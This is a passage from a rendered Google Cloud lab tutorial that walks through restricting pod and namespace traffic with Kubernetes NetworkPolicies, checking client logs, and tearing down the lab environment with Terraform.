0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">networkpolicy.networking.k8s.io/hello-server-allow-from-hello-client created</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><ol start='' ><li><p><span>Tail the logs of the &quot;blocked&quot; client again:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl logs --tail 10 -f $(kubectl get pods -oname -l app=not-hello)</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You&#39;ll now see that the output looks like this in the window tailing the &quot;blocked&quot; client:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">wget: download timed out</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">wget: download timed out</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">wget: download timed out</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">wget: download timed out</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">wget: download timed out</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">wget: download timed out</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">wget: download timed out</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">wget: download timed out</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">wget: download timed out</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">...</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 225px;"></div><div class="CodeMirror-gutters" style="display: none; height: 225px;"></div></div></div></pre><p><span>The network policy has now prevented communication to the </span><code>hello-server</code><span> from the unlabeled pod.</span></p><ol start='' ><li><p><span>Press CTRL+C to exit.</span></p></li></ol><h3 id='task-6-restricting-namespaces-with-network-policies'><span>Task 6. Restricting namespaces with Network Policies</span></h3><p><span>In the previous example, you defined a network policy that restricts connections based on pod labels. It is often useful to instead label entire namespaces, particularly when teams or applications are granted their own namespaces.</span></p><p><span>You&#39;ll now modify the network policy to only allow traffic from a designated namespace, then you&#39;ll move the </span><code>hello-allowed</code><span> pod into that new namespace.</span></p><ol start='' ><li><p><span>First, delete the existing network policy:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl delete -f ./manifests/network-policy.yaml</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">networkpolicy.networking.k8s.io "hello-server-allow-from-hello-client" deleted</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><ol start='' ><li><p><span>Create the namespaced version:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl create -f ./manifests/network-policy-namespaced.yaml</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">networkpolicy.networking.k8s.io/hello-server-allow-from-hello-client created</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><ol start='' ><li><p><span>Now observe the logs of the </span><code>hello-allowed-client</code><span> pod in the default namespace:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl logs --tail 10 -f $(kubectl get pods -oname -l app=hello)</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You will notice it is no longer able to connect to the </span><code>hello-server</code><span>.</span></p><ol start='' ><li><p><span>Press CTRL+C to exit.</span></p></li><li><p><span>Finally, deploy a second copy of the hello-clients app into the new namespace.</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl -n hello-apps apply -f ./manifests/hello-app/hello-client.yaml</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">deployment.apps/hello-client-allowed created</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">deployment.apps/hello-client-blocked created</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><strong><span>Test completed task</span></strong></p><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify your performed task. If you have successfully deployed a second copy of the hello-clients app into the new namespace, you will see an assessment score.</span></p><p><span>Deploy a second copy of the hello-clients app into the new namespace</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='task-7-validation'><span>Task 7. Validation</span></h3><p><span>Next, check the logs for the two new </span><code>hello-app</code><span> clients.</span></p><ol start='' ><li><p><span>View the logs for the &quot;hello&quot;-labeled app in the app in the </span><code>hello-apps</code><span> namespace by running:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl logs --tail 10 -f -n hello-apps $(kubectl get pods -oname -l app=hello -n hello-apps)</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Hostname: hello-server-6c6fd59cc9-7fvgp</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Hello, world!</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Version: 1.0.0</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Hostname: hello-server-6c6fd59cc9-7fvgp</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Hello, world!</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Version: 1.0.0</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Hostname: hello-server-6c6fd59cc9-7fvgp</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Hello, world!</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Version: 1.0.0</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Hostname: hello-server-6c6fd59cc9-7fvgp</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Hello, world!</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Version: 1.0.0</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Hostname: hello-server-6c6fd59cc9-7fvgp</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 293px;"></div><div class="CodeMirror-gutters" style="display: none; height: 293px;"></div></div></div></pre><p><span>Both clients are able to connect successfully because </span><em><span>as of Kubernetes 1.10.x NetworkPolicies do not support restricting access to pods within a given namespace</span></em><span>. You can allowlist by pod label, namespace label, or allowlist the union (i.e. OR) of both. But you cannot yet allowlist the intersection (i.e. AND) of pod labels and namespace labels.</span></p><ol start='' ><li><p><span>Press CTRL+C to exit.</span></p></li></ol><h3 id='task-8-teardown'><span>Task 8. Teardown</span></h3><p><span>Qwiklabs will take care of shutting down all the resources used for this lab, but here’s what you would need to do to clean up your own environment to save on cost and to be a good cloud citizen:</span></p><ol start='' ><li><p><span>Log out of the bastion host:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">exit</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Run the following to destroy the environment:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">make teardown</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">...snip...</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">google_compute_subnetwork.cluster-subnet: Still destroying... (ID: us-east1/kube-net-subnet, 20s elapsed)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">google_compute_subnetwork.cluster-subnet: Destruction complete after 25s</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">google_compute_network.gke-network: Destroying... (ID: kube-net)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">google_compute_network.gke-network: Still destroying... (ID: kube-net, 10s elapsed)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">google_compute_network.gke-network: Still destroying... (ID: kube-net, 20s elapsed)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">google_compute_network.gke-network: Destruction complete after 26s</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
